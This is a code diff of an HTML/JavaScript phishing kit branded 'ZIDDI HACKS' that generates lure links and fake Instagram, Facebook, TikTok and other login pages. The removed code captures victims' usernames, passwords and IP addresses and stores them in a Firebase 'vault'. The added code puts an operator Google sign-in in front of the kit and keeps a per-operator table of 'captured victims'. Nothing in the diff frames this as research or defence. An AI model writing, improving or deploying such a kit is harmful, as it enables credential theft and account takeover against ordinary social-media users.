@@ -3,99 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <meta property="og:title" content="🎁 Claim Your Social Media Reward!">
-    <meta property="og:description" content="Get Free Followers, Blue Tick, or Premium Access. Limited Time Offer 2026!">
-    <meta property="og:image" content="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png">
-
-    <title>ZIDDI SOCIAL HACKS | PRO</title>
+    <title>ZIDDI HACKS | Secure Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Exo+2:wght@400;600&display=swap');
         :root { --primary: #22c55e; --bg: #020617; --card: #0f172a; --neon: 0 0 15px rgba(34, 197, 94, 0.4); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Exo 2', sans-serif; }
-        body { background: var(--bg); color: white; padding: 10px; }
-        
-        .admin-box { max-width: 900px; margin: 10px auto; }
-        .header h1 { font-family: 'Orbitron'; color: var(--primary); text-align: center; text-shadow: var(--neon); font-size: 20px; margin-bottom: 15px; }
-        
-        .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 15px; margin-bottom: 15px; box-shadow: var(--neon); }
-        
-        .platform-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
-        .p-btn { background: #1e293b; padding: 12px 5px; border-radius: 12px; text-align: center; cursor: pointer; border: 1px solid transparent; transition: 0.3s; font-size: 11px; }
-        .p-btn.active { border-color: var(--primary); background: rgba(34, 197, 94, 0.1); box-shadow: var(--neon); }
-        .p-btn i { font-size: 18px; display: block; margin-bottom: 5px; }
+        body { background: var(--bg); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
 
-        .btn { width: 100%; padding: 14px; background: var(--primary); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; color: #000; }
+        /* Auth Screen */
+        .auth-container { text-align: center; background: var(--card); padding: 40px; border-radius: 30px; border: 1px solid var(--primary); box-shadow: var(--neon); width: 100%; max-width: 400px; }
+        .google-btn { background: white; color: #000; padding: 12px 25px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px; margin: 20px auto; transition: 0.3s; }
+        .google-btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255,255,255,0.2); }
 
-        #linkOutputContainer { display: none; margin-top: 15px; background: #000; padding: 15px; border-radius: 10px; border: 1px dashed var(--primary); position: relative; }
-        .copy-btn { position: absolute; right: 10px; top: 10px; background: var(--primary); color: #000; border: none; padding: 5px 12px; border-radius: 5px; font-size: 10px; font-weight: bold; cursor: pointer; }
+        /* Dashboard (Hidden) */
+        #adminUI { display: none; width: 100%; max-width: 900px; }
+        .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: var(--neon); }
+        .btn { width: 100%; padding: 15px; background: var(--primary); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; color: #000; margin-top: 10px; }
+        
+        .platform-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
+        .p-btn { background: #1e293b; padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; font-size: 11px; border: 1px solid transparent; }
+        .p-btn.active { border-color: var(--primary); background: rgba(34, 197, 94, 0.1); }
 
-        .table-wrap { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; min-width: 600px; }
-        th { color: var(--primary); text-align: left; padding: 12px; font-size: 11px; border-bottom: 1px solid #334155; text-transform: uppercase; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th { color: var(--primary); text-align: left; padding: 12px; border-bottom: 1px solid #334155; font-size: 12px; }
         td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
-        .copy-icon { color: var(--primary); cursor: pointer; margin-left: 8px; font-size: 14px; }
+        .copy-icon { color: var(--primary); cursor: pointer; margin-left: 8px; }
 
-        /* Victim UI Simulator */
-        #victimUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 99999; color: #000; justify-content: center; align-items: center; flex-direction: column; }
-        .login-box { width: 90%; max-width: 350px; text-align: center; padding: 20px; }
-        .v-input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; outline: none; }
-        .v-btn { width: 100%; padding: 12px; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        /* Victim UI Hidden */
+        #victimUI { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="adminUI" class="admin-box">
-        <div class="header"><h1>ZIDDI SOCIAL HACKS</h1></div>
-
-        <div class="card">
-            <h3 style="font-size:12px; margin-bottom:12px; color:var(--primary); font-family:'Orbitron';">GENERATE LINK</h3>
-            <div class="platform-grid">
-                <div class="p-btn active" onclick="setPlat('Instagram', this)"><i class="fab fa-instagram"></i>IG</div>
-                <div class="p-btn" onclick="setPlat('Facebook', this)"><i class="fab fa-facebook"></i>FB</div>
-                <div class="p-btn" onclick="setPlat('TikTok', this)"><i class="fab fa-tiktok"></i>TikTok</div>
-                <div class="p-btn" onclick="setPlat('YouTube', this)"><i class="fab fa-youtube"></i>YouTube</div>
-                <div class="p-btn" onclick="setPlat('Telegram', this)"><i class="fab fa-telegram"></i>Tele</div>
-                <div class="p-btn" onclick="setPlat('Twitter', this)"><i class="fab fa-twitter"></i>X</div>
-            </div>
-            <button class="btn" onclick="genLink()">GENERATE MAGIC LINK</button>
-            <div id="linkOutputContainer">
-                <button class="copy-btn" onclick="forceCopy('finalLink')">COPY</button>
-                <p id="finalLink" style="color:var(--primary); font-family:monospace; font-size:10px; word-break:break-all; padding-right:60px;"></p>
-            </div>
-        </div>
-
-        <div class="card">
-            <h3 style="font-size:12px; margin-bottom:12px; color:var(--primary); font-family:'Orbitron';">CAPTURED DATABASE</h3>
-            <div class="table-wrap">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Platform</th>
-                            <th>Credentials</th>
-                            <th>Password</th>
-                            <th>IP / Time</th>
-                        </tr>
-                    </thead>
-                    <tbody id="vTable"></tbody>
-                </table>
-            </div>
-        </div>
+    <div id="authUI" class="auth-container">
+        <h1 style="font-family:'Orbitron'; color:var(--primary);">ZIDDI HACKS</h1>
+        <p style="font-size: 12px; opacity: 0.6; margin-top: 10px;">Secure Private Dashboard</p>
+        <button class="google-btn" onclick="loginWithGoogle()">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20">
+            Continue with Google
+        </button>
     </div>
 
-    <div id="victimUI">
-        <div class="login-box">
-            <img id="vLogo" src="" width="150" style="margin-bottom:30px;">
-            <input type="text" id="vUser" class="v-input" placeholder="Phone, email or username">
-            <input type="password" id="vPass" class="v-input" placeholder="Password">
-            <button id="vBtn" class="v-btn" onclick="captureData()">Log In</button>
-            <p style="margin-top:20px; color:#385185; font-size:14px;">Forgot password?</p>
+    <div id="adminUI">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <h2 style="font-family:'Orbitron'; color:var(--primary); font-size:18px;">DASHBOARD</h2>
+            <div id="userInfo" style="font-size: 12px; display: flex; align-items: center; gap: 10px;">
+                <span id="userName"></span>
+                <button onclick="logout()" style="background:transparent; color:red; border:1px solid red; padding:4px 8px; border-radius:5px; cursor:pointer;">Logout</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3 style="font-size:14px;">GENERATE PRIVATE PHISH LINK</h3>
+            <div class="platform-grid">
+                <div class="p-btn active" onclick="setPlat('Instagram', this)">Instagram</div>
+                <div class="p-btn" onclick="setPlat('Facebook', this)">Facebook</div>
+                <div class="p-btn" onclick="setPlat('TikTok', this)">TikTok</div>
+            </div>
+            <button class="btn" onclick="genLink()">GENERATE LINK</button>
+            <div id="linkContainer" style="display:none; margin-top:15px; background:#000; padding:10px; border:1px dashed var(--primary); position:relative;">
+                <p id="finalLink" style="font-size:10px; color:var(--primary); word-break:break-all;"></p>
+                <button onclick="copyText()" style="position:absolute; right:5px; top:5px; background:var(--primary); font-size:9px; padding:2px 5px; border-radius:3px; border:none; cursor:pointer;">COPY</button>
+            </div>
+        </div>
+
+        <div class="card" style="overflow-x:auto;">
+            <h3 style="font-size:14px;">YOUR CAPTURED VICTIMS</h3>
+            <table>
+                <thead><tr><th>Platform</th><th>Credentials</th><th>Password</th><th>IP/Time</th></tr></thead>
+                <tbody id="vBody"></tbody>
+            </table>
         </div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 
     <script>
@@ -108,27 +91,31 @@
             appId: "1:371616954594:web:977d88ec7570df351246bb"
         };
         firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
         const db = firebase.firestore();
+        const provider = new firebase.auth.GoogleAuthProvider();
 
+        let currentUser = null;
         let currentPlat = "Instagram";
-        const urlParams = new URLSearchParams(window.location.search);
 
-        // Victim Detection & Dynamic UI
-        if(urlParams.has('login')) {
-            document.getElementById('adminUI').style.display = 'none';
-            document.getElementById('victimUI').style.display = 'flex';
-            const type = urlParams.get('login');
-            const logo = document.getElementById('vLogo');
-            const btn = document.getElementById('vBtn');
-            
-            if(type.includes('TikTok')) { logo.src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"; btn.style.background="#000"; }
-            else if(type.includes('YouTube')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg"; btn.style.background="#f00"; }
-            else if(type.includes('Telegram')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"; btn.style.background="#0088cc"; }
-            else if(type.includes('Twitter')) { logo.src="https://abs.twimg.com/errors/logo46x38.png"; btn.style.background="#000"; }
-            else if(type.includes('Facebook')) { logo.src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCuOTvtm4w.svg"; btn.style.background="#1877f2"; }
-            else { logo.src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png"; btn.style.background="#0095f6"; }
+        // Auth Functions
+        function loginWithGoogle() {
+            auth.signInWithPopup(provider).catch(e => alert(e.message));
         }
 
+        function logout() { auth.signOut().then(() => location.reload()); }
+
+        auth.onAuthStateChanged(user => {
+            if(user) {
+                currentUser = user;
+                document.getElementById('authUI').style.display = 'none';
+                document.getElementById('adminUI').style.display = 'block';
+                document.getElementById('userName').innerText = user.displayName;
+                loadVictims();
+            }
+        });
+
+        // Tool Logic
         function setPlat(p, el) {
             currentPlat = p;
             document.querySelectorAll('.p-btn').forEach(b => b.classList.remove('active'));
@@ -136,64 +123,35 @@
         }
 
         function genLink() {
-            const masks = {
-                'Instagram': 'Get-Free-Followers-Boost-2026',
-                'Facebook': 'Confirm-Your-Account-Identity',
-                'TikTok': 'Claim-Free-TikTok-Crown-Now',
-                'YouTube': 'YouTube-Premium-Gift-Card-Claim',
-                'Telegram': 'Telegram-New-Proxy-Login',
-                'Twitter': 'Twitter-Verification-Blue-Tick'
-            };
             const baseUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-            document.getElementById('finalLink').innerText = baseUrl + "?login=" + masks[currentPlat];
-            document.getElementById('linkOutputContainer').style.display = 'block';
+            const link = `${baseUrl}?login=${currentPlat}&ref=${currentUser.uid}`;
+            document.getElementById('finalLink').innerText = link;
+            document.getElementById('linkContainer').style.display = 'block';
         }
 
-        // Fix Mobile Copy
-        function forceCopy(id) {
-            const text = document.getElementById(id).innerText;
-            const dummy = document.createElement("textarea");
-            document.body.appendChild(dummy);
-            dummy.value = text;
-            dummy.select();
-            document.execCommand("copy");
-            document.body.removeChild(dummy);
-            alert("✅ Link Copied!");
+        function copyText() {
+            const text = document.getElementById('finalLink').innerText;
+            const el = document.createElement('textarea');
+            el.value = text; document.body.appendChild(el); el.select();
+            document.execCommand('copy'); document.body.removeChild(el);
+            alert("Link Copied!");
         }
 
-        function copyRaw(text) {
-            const dummy = document.createElement("textarea");
-            document.body.appendChild(dummy);
-            dummy.value = text;
-            dummy.select();
-            document.execCommand("copy");
-            document.body.removeChild(dummy);
-            alert("✅ Copied!");
-        }
-
-        async function captureData() {
-            const u = document.getElementById('vUser').value;
-            const p = document.getElementById('vPass').value;
-            if(!u || !p) return;
-            let ip = "0.0.0.0";
-            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
-            await db.collection('vault').add({ platform: urlParams.get('login'), user: u, pass: p, ip: ip, time: new Date().toLocaleString() });
-            window.location.href = "https://google.com";
-        }
-
-        db.collection('vault').orderBy('time', 'desc').onSnapshot(snap => {
-            const t = document.getElementById('vTable');
-            t.innerHTML = "";
-            snap.forEach(doc => {
-                const d = doc.data();
-                t.innerHTML += `<tr>
-                    <td style="color:var(--primary); font-weight:bold;">${d.platform.split('-')[0]}</td>
-                    <td>${d.user} <i class="fas fa-copy copy-icon" onclick="copyRaw('${d.user}')"></i></td>
-                    <td><code>${d.pass}</code> <i class="fas fa-copy copy-icon" onclick="copyRaw('${d.pass}')"></i></td>
-                    <td style="font-size:10px; opacity:0.6;">${d.ip}<br>${d.time}</td>
-                </tr>`;
+        function loadVictims() {
+            db.collection('vault').where('ownerUID', '==', currentUser.uid).onSnapshot(snap => {
+                const body = document.getElementById('vBody');
+                body.innerHTML = "";
+                snap.forEach(doc => {
+                    const d = doc.data();
+                    body.innerHTML += `<tr>
+                        <td style="color:var(--primary)">${d.platform}</td>
+                        <td>${d.user}</td>
+                        <td><code>${d.pass}</code></td>
+                        <td style="font-size:10px; opacity:0.6;">${d.ip}<br>${d.time}</td>
+                    </tr>`;
+                });
             });
-        });
+        }
     </script>
 </body>
 </html>
